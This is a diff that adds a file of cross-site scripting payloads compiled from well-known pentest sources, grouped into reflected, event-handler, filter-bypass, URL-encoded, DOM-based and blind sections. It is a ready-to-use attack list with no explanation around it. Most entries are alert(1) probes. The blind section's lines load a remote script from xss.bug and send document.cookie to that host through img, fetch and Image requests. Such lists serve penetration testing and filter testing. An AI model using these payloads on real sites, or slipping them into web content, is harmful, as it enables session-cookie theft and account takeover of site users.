@@ -1,0 +1,49 @@
+# XSS Payloads — Reflected + Blind
+# Sources: PortSwigger, PayloadsAllTheThings, HackTricks
+
+# Reflected XSS
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+javascript:alert(1)
+"><svg/onload=alert(1)>
+<details open ontoggle=alert(1)>
+"><details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+"><video><source onerror=alert(1)>
+
+# Event handlers
+onload=alert(1)
+onerror=alert(1)
+onclick=alert(1)
+onmouseover=alert(1)
+onfocus=alert(1)
+onanimationstart=alert(1)
+ontransitionend=alert(1)
+
+# Filter bypass
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<img src=x onerror=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>
+<svg/onload=alert(1)>
+<svg/onload=alert(1)//
+
+# Encoded
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+# DOM-based
+#<script>alert(1)</script>
+#"><script>alert(1)</script>
+javascript:alert(document.domain)
+
+# Blind XSS (needs callback server)
+"><script src=https://xss.bug/hook.js></script>
+"><img src=x onerror=this.src='https://xss.bug/log?'+document.cookie>
+"><script>fetch('https://xss.bug/log?'+btoa(document.cookie))</script>
+"><script>new Image().src='https://xss.bug/log?'+document.domain</script>
